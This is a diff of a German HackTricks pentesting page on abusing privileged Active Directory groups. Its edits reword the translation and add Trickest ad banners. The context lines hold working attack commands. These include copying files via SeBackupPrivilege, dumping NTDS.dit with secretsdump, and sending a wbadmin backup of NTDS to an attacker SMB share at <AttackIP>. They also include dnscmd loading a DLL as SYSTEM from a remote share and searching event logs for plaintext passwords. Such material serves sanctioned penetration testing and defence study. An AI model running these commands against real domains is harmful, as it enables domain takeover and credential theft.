@@ -15,13 +15,20 @@ Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 </details>
 {% endhint %}
 
-## Bekannt Gruppen mit Administrationsprivilegien
+<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+Verwende [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
+Erhalte heute Zugang:
+
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
+
+## Bekannte Gruppen mit Administrationsrechten
 
 * **Administratoren**
 * **Domänen-Administratoren**
 * **Enterprise-Administratoren**
 
-## Konto-Operatoren
+## Konto-Betreiber
 
 Diese Gruppe ist befugt, Konten und Gruppen zu erstellen, die keine Administratoren in der Domäne sind. Darüber hinaus ermöglicht sie die lokale Anmeldung am Domänencontroller (DC).
 
@@ -29,7 +36,7 @@ Um die Mitglieder dieser Gruppe zu identifizieren, wird der folgende Befehl ausg
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
-Das Hinzufügen neuer Benutzer ist erlaubt, ebenso wie die lokale Anmeldung an DC01.
+Das Hinzufügen neuer Benutzer ist erlaubt, ebenso wie die lokale Anmeldung bei DC01.
 
 ## AdminSDHolder-Gruppe
 
@@ -63,11 +70,11 @@ Mit `PsService` oder `sc` von Sysinternals kann man die Berechtigungen von Diens
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
-Dieser Befehl zeigt, dass `Server Operators` vollen Zugriff haben, was die Manipulation von Diensten für erhöhte Berechtigungen ermöglicht.
+Dieser Befehl zeigt, dass `Server Operators` vollen Zugriff haben, was die Manipulation von Diensten für erhöhte Privilegien ermöglicht.
 
 ## Backup Operators
 
-Die Mitgliedschaft in der Gruppe `Backup Operators` gewährt Zugriff auf das Dateisystem von `DC01` aufgrund der `SeBackup`- und `SeRestore`-Berechtigungen. Diese Berechtigungen ermöglichen das Durchqueren von Ordnern, das Auflisten und das Kopieren von Dateien, selbst ohne ausdrückliche Berechtigungen, unter Verwendung des `FILE_FLAG_BACKUP_SEMANTICS`-Flags. Für diesen Prozess ist die Nutzung spezifischer Skripte erforderlich.
+Die Mitgliedschaft in der Gruppe `Backup Operators` gewährt Zugriff auf das Dateisystem von `DC01` aufgrund der `SeBackup`- und `SeRestore`-Privilegien. Diese Privilegien ermöglichen das Durchqueren von Ordnern, das Auflisten und das Kopieren von Dateien, selbst ohne ausdrückliche Berechtigungen, unter Verwendung des `FILE_FLAG_BACKUP_SEMANTICS`-Flags. Für diesen Prozess ist die Nutzung spezifischer Skripte erforderlich.
 
 Um die Gruppenmitglieder aufzulisten, führen Sie aus:
 ```powershell
@@ -92,7 +99,7 @@ Get-SeBackupPrivilege
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
 ```
-### AD-Angriff
+### AD Angriff
 
 Der direkte Zugriff auf das Dateisystem des Domänencontrollers ermöglicht den Diebstahl der `NTDS.dit`-Datenbank, die alle NTLM-Hashes für Domänenbenutzer und -computer enthält.
 
@@ -131,7 +138,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 #### Verwendung von wbadmin.exe
 
 1. Richten Sie das NTFS-Dateisystem für den SMB-Server auf der Angreifermaschine ein und speichern Sie die SMB-Anmeldeinformationen auf der Zielmaschine.
-2. Verwenden Sie `wbadmin.exe` für die Systembackup- und `NTDS.dit`-Extraktion:
+2. Verwenden Sie `wbadmin.exe` für die Systembackup und `NTDS.dit` Extraktion:
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
 echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
@@ -143,7 +150,7 @@ Für eine praktische Demonstration siehe [DEMO VIDEO WITH IPPSEC](https://www.yo
 
 ## DnsAdmins
 
-Mitglieder der **DnsAdmins**-Gruppe können ihre Berechtigungen ausnutzen, um eine beliebige DLL mit SYSTEM-Berechtigungen auf einem DNS-Server zu laden, der häufig auf Domänencontrollern gehostet wird. Diese Fähigkeit ermöglicht erhebliches Ausnutzungspotenzial.
+Mitglieder der **DnsAdmins**-Gruppe können ihre Berechtigungen ausnutzen, um eine beliebige DLL mit SYSTEM-Rechten auf einem DNS-Server zu laden, der häufig auf Domänencontrollern gehostet wird. Diese Fähigkeit ermöglicht erhebliches Ausnutzungspotenzial.
 
 Um die Mitglieder der DnsAdmins-Gruppe aufzulisten, verwenden Sie:
 ```powershell
@@ -151,7 +158,7 @@ Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
 ### Führen Sie beliebige DLL aus
 
-Mitglieder können den DNS-Server anweisen, eine beliebige DLL (entweder lokal oder von einem Remote-Share) mit Befehlen wie:
+Mitglieder können den DNS-Server anweisen, eine beliebige DLL (entweder lokal oder von einem Remote-Share) mit Befehlen wie: zu laden
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -184,14 +191,14 @@ Es ist auch möglich, mimilib.dll für die Ausführung von Befehlen zu verwenden
 ### WPAD-Datensatz für MitM
 DnsAdmins können DNS-Datensätze manipulieren, um Man-in-the-Middle (MitM)-Angriffe durch das Erstellen eines WPAD-Datensatzes nach Deaktivierung der globalen Abfrageblockliste durchzuführen. Tools wie Responder oder Inveigh können zum Spoofing und Erfassen von Netzwerkverkehr verwendet werden.
 
-### Event-Log-Reader
+### Event Log Readers
 Mitglieder können auf Ereignisprotokolle zugreifen und möglicherweise sensible Informationen wie Klartextpasswörter oder Details zur Befehlsausführung finden:
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
-## Exchange Windows Berechtigungen
+## Exchange Windows Berechtigungen  
 Diese Gruppe kann DACLs auf dem Domänenobjekt ändern und möglicherweise DCSync-Berechtigungen gewähren. Techniken zur Privilegieneskalation, die diese Gruppe ausnutzen, sind im Exchange-AD-Privesc GitHub-Repo detailliert beschrieben.
 ```powershell
 # List members
@@ -207,7 +214,7 @@ Der Mozilla Wartungsdienst von Firefox kann von Hyper-V-Administratoren ausgenut
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
-Note: Die Ausnutzung von Hardlinks wurde in den neuesten Windows-Updates gemindert.
+Hinweis: Die Ausnutzung von Hardlinks wurde in den neuesten Windows-Updates gemindert.
 
 ## Organisation Management
 
@@ -233,7 +240,7 @@ Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users
 Weitere Einblicke in die Ausnutzung von RDP finden sich in speziellen Pentesting-Ressourcen.
 
 #### Remote Management Users
-Mitglieder können über **Windows Remote Management (WinRM)** auf PCs zugreifen. Die Aufzählung dieser Mitglieder erfolgt durch:
+Mitglieder können PCs über **Windows Remote Management (WinRM)** zugreifen. Die Aufzählung dieser Mitglieder erfolgt durch:
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
@@ -261,6 +268,13 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 * [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
 * [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
 * [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
+
+<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection), um Workflows, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden, einfach zu erstellen und **zu automatisieren**.\
+Zugang heute erhalten:
+
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {% hint style="success" %}
 Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
